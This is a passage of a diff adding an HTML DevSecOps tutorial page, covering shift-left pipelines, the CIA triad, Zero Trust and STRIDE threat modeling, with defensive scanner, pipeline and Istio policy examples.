@@ -1,0 +1,1643 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security &amp; DevSecOps Complete Guide — Basics to Advanced</title>
+<style>
+  :root {
+    --bg: #0d1117; --bg-alt: #161b22; --bg-code: #1e242c; --sidebar: #11151c;
+    --text: #c9d1d9; --text-dim: #8b949e; --heading: #ffffff;
+    --accent: #58a6ff; --accent2: #7ee787; --border: #30363d;
+    --brand: #d13438; --warn: #f0883e; --danger: #ff7b72; --tip: #56d364;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg); color: var(--text); line-height: 1.7; font-size: 16px; }
+  .layout { display: flex; }
+  .sidebar { width: 320px; background: var(--sidebar); border-right: 1px solid var(--border); height: 100vh; position: fixed; top: 0; left: 0; overflow-y: auto; padding: 0 0 40px 0; }
+  .sidebar-header { padding: 20px; border-bottom: 1px solid var(--border); position: sticky; top: 0; background: var(--sidebar); z-index: 10; }
+  .sidebar-header h1 { font-size: 18px; margin: 0; color: var(--heading); display: flex; align-items: center; gap: 10px; }
+  .sidebar-header .logo { width: 28px; height: 28px; background: var(--brand); border-radius: 6px; display: inline-flex; align-items: center; justify-content: center; font-weight: bold; color: white; font-size: 14px; }
+  .sidebar-header p { font-size: 12px; color: var(--text-dim); margin: 6px 0 0; }
+  .search-box { width: 100%; padding: 8px 12px; margin-top: 12px; background: var(--bg); border: 1px solid var(--border); border-radius: 6px; color: var(--text); font-size: 13px; }
+  .nav { padding: 10px 0; }
+  .nav-group-title { padding: 12px 20px 6px; font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; color: var(--text-dim); font-weight: 700; }
+  .nav a { display: block; padding: 6px 20px 6px 28px; color: var(--text-dim); text-decoration: none; font-size: 13.5px; border-left: 2px solid transparent; }
+  .nav a:hover { color: var(--accent); background: rgba(88,166,255,0.06); }
+  .nav a.active { color: var(--accent); border-left-color: var(--brand); background: rgba(209,52,56,0.12); }
+  .content { margin-left: 320px; padding: 40px 60px 120px; max-width: 1000px; }
+  @media (max-width: 900px) { .sidebar { transform: translateX(-100%); transition: transform .3s; z-index: 100; } .sidebar.open { transform: translateX(0); } .content { margin-left: 0; padding: 20px; } .menu-toggle { display: inline-flex !important; } }
+  .menu-toggle { display: none; position: fixed; top: 12px; left: 12px; z-index: 200; background: var(--brand); color: white; border: none; padding: 10px 14px; border-radius: 6px; cursor: pointer; font-size: 16px; }
+  h1, h2, h3, h4 { color: var(--heading); line-height: 1.3; scroll-margin-top: 20px; }
+  h1 { font-size: 34px; border-bottom: 2px solid var(--brand); padding-bottom: 12px; margin-top: 10px; }
+  h2 { font-size: 27px; margin-top: 56px; border-bottom: 1px solid var(--border); padding-bottom: 8px; }
+  h3 { font-size: 21px; margin-top: 36px; color: var(--accent); }
+  h4 { font-size: 17px; margin-top: 24px; color: var(--accent2); }
+  p { margin: 12px 0; }
+  a { color: var(--accent); }
+  ul, ol { padding-left: 24px; }
+  li { margin: 6px 0; }
+  strong { color: #e6edf3; }
+  hr { border: none; border-top: 1px solid var(--border); margin: 40px 0; }
+  code { background: var(--bg-code); padding: 2px 6px; border-radius: 4px; font-family: "SF Mono", "Fira Code", Consolas, Monaco, monospace; font-size: 13.5px; color: #ffa657; }
+  pre { background: var(--bg-code); border: 1px solid var(--border); border-radius: 8px; padding: 16px; overflow-x: auto; position: relative; margin: 16px 0; }
+  pre code { background: none; padding: 0; color: #c9d1d9; display: block; }
+  .code-label { display: inline-block; font-size: 11px; text-transform: uppercase; letter-spacing: 0.05em; padding: 3px 10px; border-radius: 4px 4px 0 0; font-weight: 700; margin-top: 16px; margin-bottom: -8px; }
+  .label-cmd { background: #347d39; color: white; }
+  .label-yaml { background: #6e40c9; color: white; }
+  .label-output { background: #444c56; color: #c9d1d9; }
+  .label-config { background: #1f6feb; color: white; }
+  .box { border-radius: 8px; padding: 14px 18px; margin: 18px 0; border-left: 4px solid; background: var(--bg-alt); }
+  .box p:first-child { margin-top: 0; }
+  .box p:last-child { margin-bottom: 0; }
+  .box-title { font-weight: 700; display: block; margin-bottom: 6px; }
+  .tip { border-color: var(--tip); } .tip .box-title { color: var(--tip); }
+  .warn { border-color: var(--warn); } .warn .box-title { color: var(--warn); }
+  .danger { border-color: var(--danger); } .danger .box-title { color: var(--danger); }
+  .note { border-color: var(--accent); } .note .box-title { color: var(--accent); }
+  .best { border-color: var(--brand); background: rgba(209,52,56,0.06); } .best .box-title { color: #ff6b6f; } .best .box-title::before { content: "★ "; }
+  table { border-collapse: collapse; width: 100%; margin: 18px 0; font-size: 14px; }
+  th, td { border: 1px solid var(--border); padding: 10px 12px; text-align: left; vertical-align: top; }
+  th { background: var(--bg-alt); color: var(--heading); }
+  tr:nth-child(even) td { background: rgba(255,255,255,0.02); }
+  .trouble { background: rgba(255,123,114,0.05); border: 1px solid rgba(255,123,114,0.3); border-radius: 8px; padding: 4px 18px; margin: 18px 0; }
+  .trouble h4 { color: var(--danger); }
+  .lead { font-size: 18px; color: var(--text-dim); }
+  .back-to-top { position: fixed; bottom: 24px; right: 24px; background: var(--brand); color: white; border: none; width: 44px; height: 44px; border-radius: 50%; cursor: pointer; font-size: 20px; opacity: 0; transition: opacity .3s; z-index: 50; }
+  .back-to-top.show { opacity: 0.9; }
+  .section-intro { font-size: 16px; color: var(--text-dim); margin-bottom: 20px; }
+  figure.diagram { margin: 24px 0; padding: 20px; background: var(--bg-alt); border: 1px solid var(--border); border-radius: 10px; text-align: center; }
+  figure.diagram svg { max-width: 100%; height: auto; }
+  figure.diagram figcaption { margin-top: 12px; font-size: 13px; color: var(--text-dim); font-style: italic; }
+  .svg-label { font: 600 13px -apple-system, sans-serif; fill: #c9d1d9; }
+  .svg-sub { font: 400 11px -apple-system, sans-serif; fill: #8b949e; }
+  .svg-title { font: 700 14px -apple-system, sans-serif; fill: #fff; }
+  .eli5 { border-color: #d2a8ff; background: rgba(210,168,255,0.06); }
+  .eli5 .box-title { color: #d2a8ff; } .eli5 .box-title::before { content: "🧑‍🏫 "; }
+
+  /* ===== Responsive & zoom-friendly overrides (round 7) ===== */
+  :root { --sb-w: clamp(240px, 22vw, 320px); }
+  html { font-size: clamp(15px, 0.55vw + 13px, 18px); }
+  .sidebar { width: var(--sb-w); }
+  .content { margin-left: var(--sb-w); max-width: 68rem; width: auto; padding: 2.5rem clamp(16px, 4vw, 60px) 7rem; }
+  img, svg, video, canvas { max-width: 100%; height: auto; }
+  figure.diagram svg { width: 100%; height: auto; }
+  pre { max-width: 100%; overflow-x: auto; }
+  table { display: block; overflow-x: auto; max-width: 100%; }
+  .content { overflow-wrap: anywhere; }
+  @media (max-width: 1200px) { .content { max-width: none; } }
+  @media (max-width: 900px) {
+    .sidebar { width: min(85vw, 320px); transform: translateX(-100%); transition: transform .3s; z-index: 100; }
+    .sidebar.open { transform: translateX(0); }
+    .content { margin-left: 0; padding: 3.2rem 1rem 5rem; }
+    .menu-toggle { display: inline-flex !important; }
+  }
+  @media (max-width: 600px) {
+    h1 { font-size: 1.7rem; } h2 { font-size: 1.4rem; } h3 { font-size: 1.15rem; }
+    .content { padding: 3.2rem .8rem 4rem; }
+  }
+
+</style>
+</head>
+<body>
+<button class="menu-toggle" onclick="document.querySelector('.sidebar').classList.toggle('open')">☰</button>
+<div class="layout">
+<aside class="sidebar">
+  <div class="sidebar-header">
+    <h1><span class="logo">🔒</span> Security &amp; DevSecOps</h1>
+    <p>Shift-left security across the lifecycle</p>
+    <a href="index.html" style="display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:8px 16px;background:transparent;border:2px solid var(--brand,#d13438);color:var(--brand,#d13438);border-radius:999px;font-size:13px;font-weight:700;text-decoration:none;">🛡 Home</a>
+    <input type="text" class="search-box" id="navSearch" placeholder="Filter sections..." onkeyup="filterNav()">
+  </div>
+  <nav class="nav" id="navList">
+    <div class="nav-group-title">Part 1 — Foundations</div>
+    <a href="#intro">0. How to use this guide</a>
+    <a href="#what-is-devsecops">1. What is DevSecOps?</a>
+    <a href="#cia">2. Core Principles (CIA, Zero Trust)</a>
+    <a href="#threat-model">3. Threat Modeling</a>
+
+    <div class="nav-group-title">Part 2 — Shift-Left Pipeline</div>
+    <a href="#secure-sdlc">4. Security in the SDLC</a>
+    <a href="#sast-dast">5. SAST, DAST &amp; SCA</a>
+    <a href="#secrets">6. Secrets Management</a>
+    <a href="#supply-chain">7. Supply Chain Security</a>
+
+    <div class="nav-group-title">Part 3 — Runtime &amp; Cloud</div>
+    <a href="#container-security">8. Container &amp; Image Security</a>
+    <a href="#k8s-security">9. Kubernetes Security</a>
+    <a href="#cloud-security">10. Cloud Security &amp; CSPM</a>
+    <a href="#runtime">11. Runtime Detection</a>
+
+    <div class="nav-group-title">Part 4 — Governance</div>
+    <a href="#compliance">12. Compliance &amp; Policy as Code</a>
+    <a href="#owasp">13. OWASP Top 10</a>
+
+    <div class="nav-group-title">Part 5 — Cryptography &amp; Identity</div>
+    <a href="#crypto">14. Cryptography Fundamentals</a>
+    <a href="#pki-tls">15. PKI &amp; TLS Deep Dive</a>
+    <a href="#identity">16. Identity, AuthN &amp; AuthZ</a>
+    <a href="#network-sec">17. Network Security Deep</a>
+
+    <div class="nav-group-title">Part 6 — AppSec &amp; Testing</div>
+    <a href="#appsec">18. Secure Coding &amp; AppSec</a>
+    <a href="#testing-deep">19. SAST/DAST/IAST/SCA/Fuzzing</a>
+    <a href="#vault-deep">20. Secrets &amp; Vault Deep</a>
+
+    <div class="nav-group-title">Part 7 — Runtime &amp; Ops Security</div>
+    <a href="#container-escape">21. Container Escape &amp; Isolation</a>
+    <a href="#k8s-cis">22. Kubernetes Security &amp; CIS</a>
+    <a href="#siem">23. SIEM, SOC &amp; Detection</a>
+    <a href="#pentest">24. Pentesting &amp; Red Teaming</a>
+    <a href="#zero-trust">25. Zero-Trust Architecture</a>
+
+    <div class="nav-group-title">Part 8 — Apply It</div>
+    <a href="#capstone">26. Capstone: Secure a 3-Tier App</a>
+    <a href="#interview">27. Interview Prep</a>
+
+    <div class="nav-group-title">Part 9 — Reference</div>
+    <a href="#best-practices">28. Best Practices</a>
+    <a href="#troubleshooting">29. Incident Checklist</a>
+  </nav>
+</aside>
+
+<main class="content" id="top">
+<h1 id="intro">Security &amp; DevSecOps: The Complete Guide</h1>
+<p class="lead">Build security into every stage of the software lifecycle — from threat modeling and pipeline scanning to container, Kubernetes, and cloud hardening — so security is everyone's job, automated and continuous.</p>
+
+<div class="box note">
+  <span class="box-title">📖 How to read this guide</span>
+  <p>Each topic: <strong>what</strong>, <strong>why it matters</strong>, <strong>how to implement</strong>, and <strong>★ best practice</strong>. This guide ties together the security threads running through the <a href="cicd-complete-guide.html">CI/CD</a>, <a href="docker-complete-guide.html">Docker</a>, <a href="kubernetes-complete-guide.html">Kubernetes</a>, and <a href="cloud-aws-complete-guide.html">Cloud</a> guides.</p>
+</div>
+
+<h2 id="what-is-devsecops">1. What is DevSecOps?</h2>
+<p class="section-intro">DevSecOps means baking security <em>into</em> DevOps — automated, continuous, and owned by everyone — instead of a gate at the end run by a separate team.</p>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 210" role="img" aria-label="Security bolted on at the end versus shifted left">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Shift security LEFT — earlier is cheaper</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="30" y="70" width="110" height="45" rx="6" fill="#21262d" stroke="#7ee787"/><text x="85" y="97" text-anchor="middle" class="svg-sub">Code</text>
+    <rect x="160" y="70" width="110" height="45" rx="6" fill="#21262d" stroke="#7ee787"/><text x="215" y="97" text-anchor="middle" class="svg-sub">Build</text>
+    <rect x="290" y="70" width="110" height="45" rx="6" fill="#21262d" stroke="#7ee787"/><text x="345" y="97" text-anchor="middle" class="svg-sub">Test</text>
+    <rect x="420" y="70" width="110" height="45" rx="6" fill="#21262d" stroke="#7ee787"/><text x="475" y="97" text-anchor="middle" class="svg-sub">Deploy</text>
+    <rect x="550" y="70" width="110" height="45" rx="6" fill="#21262d" stroke="#7ee787"/><text x="605" y="97" text-anchor="middle" class="svg-sub">Operate</text>
+    <text x="150" y="150" text-anchor="middle" class="svg-sub" fill="#56d364">fix here = $1</text>
+    <text x="605" y="150" text-anchor="middle" class="svg-sub" fill="#ff7b72">fix here = $100+</text>
+    <line x1="30" y1="175" x2="660" y2="175" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ds)"/>
+    <text x="345" y="197" text-anchor="middle" class="svg-sub">A vuln caught in code review is trivial; the same vuln in production is a breach.</text>
+  </g>
+  <defs><marker id="ds" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#8b949e"/></marker></defs>
+</svg>
+<figcaption>"Shift left" = move security checks as early as possible. Automated scanning in the pipeline catches issues when they're cheapest to fix.</figcaption>
+</figure>
+
+<div class="box eli5">
+  <span class="box-title">DevSecOps = security is everyone's job, automated</span>
+  <p>The old way: developers build for months, then a security team reviews at the end and finds problems too late to fix cheaply. DevSecOps bakes security checks into the everyday pipeline — like spell-check running as you type instead of a proofreader at the very end. Small, automated, continuous checks catch issues immediately, and the whole team owns security rather than tossing it over a wall.</p>
+</div>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 300" role="img" aria-label="Automated security gates at each stage of a shift-left pipeline">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Shift-left pipeline: an automated security gate at every stage</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="24" y="90" width="130" height="70" rx="8" fill="#21262d" stroke="#7ee787"/><text x="89" y="118" text-anchor="middle" class="svg-label">Commit</text><text x="89" y="138" text-anchor="middle" class="svg-sub">gitleaks</text><text x="89" y="153" text-anchor="middle" class="svg-sub">pre-commit</text>
+    <rect x="182" y="90" width="130" height="70" rx="8" fill="#21262d" stroke="#58a6ff"/><text x="247" y="118" text-anchor="middle" class="svg-label">Build</text><text x="247" y="138" text-anchor="middle" class="svg-sub">SAST + SCA</text><text x="247" y="153" text-anchor="middle" class="svg-sub">SBOM (syft)</text>
+    <rect x="340" y="90" width="130" height="70" rx="8" fill="#21262d" stroke="#58a6ff"/><text x="405" y="118" text-anchor="middle" class="svg-label">Test</text><text x="405" y="138" text-anchor="middle" class="svg-sub">DAST (ZAP)</text><text x="405" y="153" text-anchor="middle" class="svg-sub">image scan</text>
+    <rect x="498" y="90" width="130" height="70" rx="8" fill="#21262d" stroke="#f0883e"/><text x="563" y="118" text-anchor="middle" class="svg-label">Release</text><text x="563" y="138" text-anchor="middle" class="svg-sub">cosign sign</text><text x="563" y="153" text-anchor="middle" class="svg-sub">SLSA attest</text>
+    <rect x="656" y="90" width="140" height="70" rx="8" fill="#21262d" stroke="#d13438" stroke-width="2"/><text x="726" y="118" text-anchor="middle" class="svg-label" fill="#ff6b6f">Deploy/Run</text><text x="726" y="138" text-anchor="middle" class="svg-sub">admission verify</text><text x="726" y="153" text-anchor="middle" class="svg-sub">Falco runtime</text>
+    <g stroke="#8b949e" stroke-width="1.5">
+      <line x1="154" y1="125" x2="180" y2="125" marker-end="url(#sec-gate)"/>
+      <line x1="312" y1="125" x2="338" y2="125" marker-end="url(#sec-gate)"/>
+      <line x1="470" y1="125" x2="496" y2="125" marker-end="url(#sec-gate)"/>
+      <line x1="628" y1="125" x2="654" y2="125" marker-end="url(#sec-gate)"/>
+    </g>
+    <rect x="24" y="200" width="772" height="34" rx="6" fill="none" stroke="#56d364" stroke-dasharray="4 3"/>
+    <text x="410" y="222" text-anchor="middle" class="svg-sub" fill="#56d364">Any gate can FAIL the build → the artifact never advances. Cheap to fix on the left, catastrophic on the right.</text>
+    <text x="410" y="262" text-anchor="middle" class="svg-sub">Each stage inspects a different artifact — code, dependencies, running app, signed image, live workload — so nothing slips through a single blind spot.</text>
+  </g>
+  <defs><marker id="sec-gate" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#8b949e"/></marker></defs>
+</svg>
+<figcaption>Each pipeline stage gets its own automated gate. A failing gate stops promotion, so vulnerabilities are caught at the phase where they are cheapest to fix.</figcaption>
+</figure>
+
+<h4>Why DevSecOps exists</h4>
+<p>The classic "security as a final gate" model breaks down at DevOps velocity. When teams deploy dozens of times per day, a manual security review that takes days becomes the bottleneck that either blocks releases or gets skipped entirely. Worse, the economics are brutal: an IBM Systems Sciences study found a defect caught in design costs roughly 1×, in build ~6×, in QA ~15×, and in production ~100× to fix. Security bugs follow the same curve — but a production security bug is not just expensive, it can be a data breach. DevSecOps exists to make the secure path the <em>fast</em> path, so security scales with delivery speed instead of fighting it.</p>
+
+<h4>How it works under the hood</h4>
+<p>DevSecOps is three things working together: (1) <strong>automation</strong> — every security check runs as code in the pipeline (SAST, SCA, secret scanning, IaC scanning, image scanning) so there is no human in the critical path for routine checks; (2) <strong>guardrails, not gates</strong> — policies are encoded (OPA/Kyverno, pre-commit hooks) so violations are caught at the earliest possible moment with a clear, fast feedback loop back to the author; (3) <strong>shared ownership</strong> — developers get security findings inside their normal tools (IDE, PR comments), and a small security team builds the platform and paved roads rather than manually reviewing every change.</p>
+
+<div class="code-label label-yaml">A minimal DevSecOps gate in a pipeline (GitHub Actions)</div>
+<pre><code>name: security-gate
+on: [pull_request]
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Secret scan (fail if any secret found)
+        run: gitleaks detect --no-banner --redact
+      - name: SAST
+        uses: returntocorp/semgrep-action@v1
+      - name: Dependency + IaC scan
+        run: trivy fs --severity HIGH,CRITICAL --exit-code 1 .</code></pre>
+<div class="code-label label-output">What a developer sees when the gate blocks a bad PR</div>
+<pre><code>gitleaks: leak found
+  File:   src/config/db.js
+  Secret: AKIA****************  (AWS access key)
+  Rule:   aws-access-token
+  Commit: 8f2a1c9
+##[error] Process completed with exit code 1
+# → PR is blocked; author rotates the key and removes it before merge</code></pre>
+
+<div class="box warn"><span class="box-title">Common mistakes when adopting DevSecOps</span><ul><li><strong>Turning on every scanner at "fail on all"</strong> — floods developers with noise, they lose trust and disable it. Start at high/critical only.</li><li><strong>Making security a separate pipeline</strong> that runs after merge — that is just the old gate in a new place. Checks must run <em>in the PR</em>, before merge.</li><li><strong>No owner for findings</strong> — a dashboard nobody looks at is not security. Findings need to route to the person who can fix them.</li><li><strong>Treating it as a tool purchase</strong> — DevSecOps is mostly culture and process; tools are ~20% of it.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: the airport vs the TSA line</span><p>Old-school security is one big TSA checkpoint at the end — everyone piles up, it's slow, and if you fail you go all the way back. DevSecOps is more like a modern airport where your ID, bag, and boarding pass are checked continuously at small touchpoints along the way. Each check is fast and specific, so problems surface early and you almost never get sent back to the start.</p></div>
+
+<h2 id="cia">2. Core Principles — CIA &amp; Zero Trust</h2>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 320" role="img" aria-label="The CIA triad of confidentiality, integrity and availability">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">The CIA triad — the three goals every control serves</text>
+  <g font-family="-apple-system, sans-serif">
+    <polygon points="410,55 175,255 645,255" fill="none" stroke="#8b949e" stroke-width="1.5"/>
+    <circle cx="410" cy="70" r="8" fill="#58a6ff"/><text x="410" y="48" text-anchor="middle" class="svg-label" fill="#58a6ff">Confidentiality</text>
+    <text x="410" y="98" text-anchor="middle" class="svg-sub">encryption + access control</text>
+    <circle cx="175" cy="255" r="8" fill="#7ee787"/><text x="150" y="285" text-anchor="middle" class="svg-label" fill="#7ee787">Integrity</text>
+    <text x="150" y="302" text-anchor="middle" class="svg-sub">hashing + signatures</text>
+    <circle cx="645" cy="255" r="8" fill="#f0883e"/><text x="670" y="285" text-anchor="middle" class="svg-label" fill="#f0883e">Availability</text>
+    <text x="670" y="302" text-anchor="middle" class="svg-sub">redundancy + rate limit</text>
+    <text x="410" y="175" text-anchor="middle" class="svg-label">SECURITY</text>
+    <text x="410" y="195" text-anchor="middle" class="svg-sub">a control protects at least one corner —</text>
+    <text x="410" y="212" text-anchor="middle" class="svg-sub">and may weaken another (name the tradeoff)</text>
+  </g>
+</svg>
+<figcaption>Every security control serves at least one corner of the triad. Naming which property you protect makes tradeoffs explicit — e.g. more replicas raise availability but widen the confidentiality attack surface.</figcaption>
+</figure>
+<table>
+  <tr><th>Principle</th><th>Meaning</th></tr>
+  <tr><td><strong>Confidentiality</strong></td><td>Only authorized parties can read data (encryption, access control)</td></tr>
+  <tr><td><strong>Integrity</strong></td><td>Data isn't tampered with (signing, checksums)</td></tr>
+  <tr><td><strong>Availability</strong></td><td>Systems stay up for legitimate users (DDoS protection, redundancy)</td></tr>
+  <tr><td><strong>Least privilege</strong></td><td>Grant the minimum access needed, nothing more</td></tr>
+  <tr><td><strong>Defense in depth</strong></td><td>Multiple layers, so one failure isn't a breach</td></tr>
+  <tr><td><strong>Zero Trust</strong></td><td>Never trust by network location; verify every request explicitly</td></tr>
+</table>
+<div class="box note"><span class="box-title">Zero Trust in practice</span><p>The old model trusted anything "inside the network." Zero Trust assumes the network is already hostile: every service authenticates every request (mTLS, tokens), regardless of origin. The <a href="kubernetes-complete-guide.html#service-mesh">service mesh</a> mTLS and <a href="kubernetes-complete-guide.html#networkpolicy">NetworkPolicies</a> are Zero Trust building blocks.</p></div>
+
+<h4>Why the CIA triad exists</h4>
+<p>Every security control you will ever build serves at least one of these three goals, so the triad is the vocabulary that lets you reason about tradeoffs. It exists because "make it secure" is meaningless until you decide <em>what property</em> you are protecting. Encrypting a database protects <strong>confidentiality</strong> but does nothing for <strong>availability</strong>; adding replicas improves availability but can widen the confidentiality attack surface. Naming the property forces you to be explicit and reveals when a control for one pillar quietly weakens another.</p>
+
+<h4>How each pillar is actually enforced under the hood</h4>
+<ul>
+<li><strong>Confidentiality</strong> = encryption (AES-GCM at rest, TLS in transit) + access control (IAM, RBAC). The data is unreadable without the key, and the key is only released to authorized identities.</li>
+<li><strong>Integrity</strong> = cryptographic hashing and signatures. A SHA-256 hash detects accidental change; an HMAC or digital signature detects <em>malicious</em> change because the attacker cannot forge it without the key.</li>
+<li><strong>Availability</strong> = redundancy + rate limiting + DDoS absorption. It is a security property because an attacker who takes you offline has defeated you just as surely as one who steals data.</li>
+</ul>
+
+<h4>How Zero Trust verifies a single request</h4>
+<p>Concretely, when service A calls service B in a Zero Trust mesh, every request is evaluated fresh — there is no "we already let this IP in":</p>
+<ol>
+<li><strong>Identity</strong>: A presents a cryptographic identity (an mTLS client certificate, e.g. a SPIFFE ID like <code>spiffe://cluster/ns/payments/sa/api</code>). B verifies the cert chains to the mesh CA.</li>
+<li><strong>Authorization</strong>: B checks a policy — "is <code>payments/api</code> allowed to call <code>POST /charge</code>?" — evaluated per-request, not per-connection.</li>
+<li><strong>Context</strong>: modern implementations also factor in device posture, token freshness, and anomaly signals before granting access.</li>
+</ol>
+
+<div class="code-label label-yaml">Zero Trust authorization: only the "api" identity may call "db" (Istio)</div>
+<pre><code>apiVersion: security.istio.io/v1
+kind: AuthorizationPolicy
+metadata: { name: db-allow-api-only, namespace: payments }
+spec:
+  selector: { matchLabels: { app: db } }
+  action: ALLOW
+  rules:
+    - from:
+        - source:
+            principals: ["cluster.local/ns/payments/sa/api"]  # verified via mTLS
+      to:
+        - operation: { ports: ["5432"] }
+# Any other identity — even from inside the same namespace — is DENIED by default.</code></pre>
+
+<div class="box danger"><span class="box-title">Common mistakes around CIA &amp; Zero Trust</span><ul><li><strong>"We have a firewall, so the internal network is trusted."</strong> This is exactly the assumption Zero Trust rejects — one phished laptop and the attacker moves laterally unchecked.</li><li><strong>Confusing encryption with integrity.</strong> Encrypting data (confidentiality) does not prove it wasn't swapped; you also need authenticated encryption or a signature for integrity.</li><li><strong>Ignoring availability as a security concern.</strong> Ransomware and DDoS attack availability directly.</li><li><strong>"Zero Trust" as a product you buy.</strong> It is an architecture (strong identity + per-request authz + least privilege + assume-breach), not a SKU.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: nightclub with per-drink ID checks</span><p>Perimeter security is a bouncer at the door — once you're in, you can go anywhere. Zero Trust is a club where a staff member checks your wristband at <em>every</em> bar, every VIP room, every time — even if you were let in five minutes ago. Annoying for an intruder, invisible for a legitimate guest whose wristband is always valid.</p></div>
+
+<h2 id="threat-model">3. Threat Modeling</h2>
+<p class="section-intro">Before building defenses, ask: what are we protecting, from whom, and how might they attack? A lightweight threat model early prevents expensive redesigns.</p>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 320" role="img" aria-label="STRIDE threat categories applied across a trust boundary">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">STRIDE — walk each threat class across a trust boundary</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="40" y="120" width="120" height="60" rx="8" fill="#21262d" stroke="#58a6ff"/><text x="100" y="148" text-anchor="middle" class="svg-label">Browser</text><text x="100" y="166" text-anchor="middle" class="svg-sub">untrusted</text>
+    <line x1="245" y1="70" x2="245" y2="230" stroke="#d13438" stroke-width="2" stroke-dasharray="5 4"/><text x="245" y="60" text-anchor="middle" class="svg-sub" fill="#ff6b6f">trust boundary</text>
+    <rect x="330" y="120" width="120" height="60" rx="8" fill="#21262d" stroke="#7ee787"/><text x="390" y="148" text-anchor="middle" class="svg-label">API</text><text x="390" y="166" text-anchor="middle" class="svg-sub">trusted</text>
+    <line x1="160" y1="150" x2="328" y2="150" stroke="#8b949e" stroke-width="1.5" marker-end="url(#sec-stride)"/><text x="245" y="142" text-anchor="middle" class="svg-sub">request + JWT</text>
+    <rect x="500" y="55" width="290" height="210" rx="8" fill="none" stroke="#484f58"/>
+    <text x="645" y="78" text-anchor="middle" class="svg-label" fill="#f0883e">STRIDE → mitigation</text>
+    <text x="515" y="104" class="svg-sub">S poofing → authenticate (verify JWT sig)</text>
+    <text x="515" y="128" class="svg-sub">T ampering → integrity / recompute server-side</text>
+    <text x="515" y="152" class="svg-sub">R epudiation → append-only audit log</text>
+    <text x="515" y="176" class="svg-sub">I nfo disclosure → encrypt + authz + generic errs</text>
+    <text x="515" y="200" class="svg-sub">D enial of service → rate limit + WAF + autoscale</text>
+    <text x="515" y="224" class="svg-sub">E levation of priv → least-priv, per-route role check</text>
+    <text x="645" y="250" text-anchor="middle" class="svg-sub">every boundary crossing = where an attacker gets leverage</text>
+  </g>
+  <defs><marker id="sec-stride" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#8b949e"/></marker></defs>
+</svg>
+<figcaption>Diagram data flows, mark trust boundaries, then walk the six STRIDE categories across each crossing. Each threat maps to a concrete mitigation category.</figcaption>
+</figure>
+<div class="box best"><span class="box-title">STRIDE — a simple threat checklist</span><p>For each component ask about <strong>S</strong>poofing (impersonation), <strong>T</strong>ampering (modification), <strong>R</strong>epudiation (denying actions), <strong>I</strong>nformation disclosure (leaks), <strong>D</strong>enial of service, and <strong>E</strong>levation of privilege. Diagram your data flows, mark trust boundaries, and walk STRIDE across each boundary. An hour of this at design time saves weeks later.</p></div>
+
+<h4>Why threat modeling exists</h4>
+<p>You cannot defend against threats you have never named. Threat modeling exists to make the implicit explicit <em>before</em> code is written, when changing the design costs a conversation instead of a rewrite. It answers four questions in order: What are we building? What can go wrong? What are we going to do about it? Did we do a good job? Skipping it is how teams ship an admin endpoint with no authz or a message queue that trusts any publisher — flaws that no scanner will flag because they are design decisions, not bugs.</p>
+
+<h4>How it works under the hood: data flow + trust boundaries</h4>
+<p>The mechanical core is a <strong>data flow diagram (DFD)</strong> annotated with <strong>trust boundaries</strong> — the lines where data crosses from a less-trusted zone to a more-trusted one (internet → load balancer, app → database, tenant A → tenant B). Every arrow that crosses a boundary is where you apply STRIDE, because that crossing is where an attacker gets leverage. Each identified threat maps to a mitigation category: Spoofing→authentication, Tampering→integrity/signing, Repudiation→logging, Info disclosure→encryption/authz, DoS→rate-limits/quotas, Elevation→least-privilege/authz.</p>
+
+<div class="code-label label-config">STRIDE walk of one trust boundary: browser → API</div>
+<pre><code>Boundary: Internet (untrusted) --&gt; API service (trusted)
+Data flow: HTTP request carrying user JWT + JSON body
+
+S  Spoofing            -&gt; forge another user's session   -&gt; verify JWT signature + exp/aud/iss
+T  Tampering           -&gt; alter price field in cart body  -&gt; server recomputes price; never trust client
+R  Repudiation         -&gt; "I never placed that order"     -&gt; append-only audit log w/ user id + ts
+I  Info disclosure     -&gt; error leaks stack trace / SQL   -&gt; generic errors in prod; log details server-side
+D  Denial of Service   -&gt; flood /login                    -&gt; rate limit + WAF + autoscale
+E  Elevation of priv.  -&gt; /admin reachable by normal user -&gt; server-side role check on every admin route</code></pre>
+
+<div class="box warn"><span class="box-title">Common threat-modeling mistakes</span><ul><li><strong>Modeling only the happy path.</strong> Attackers use the paths you didn't draw — background jobs, admin tools, internal APIs, the "temporary" debug endpoint.</li><li><strong>Making it a giant one-time document.</strong> A threat model that isn't revisited when the design changes rots. Keep it lightweight and living.</li><li><strong>Stopping at "identify."</strong> A threat without a tracked mitigation (an actual ticket) is just anxiety.</li><li><strong>Ignoring the human/process boundary</strong> — e.g., who can approve a deploy, who holds the KMS key.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: planning a bank heist against yourself</span><p>Before opening a bank, you'd walk the floor as a robber: Where's the cash? How would I get in? Which door is unlocked at night? Threat modeling is playing the attacker against your own design on paper — cheap, fast, and it tells you exactly which doors to lock before you've poured the concrete.</p></div>
+
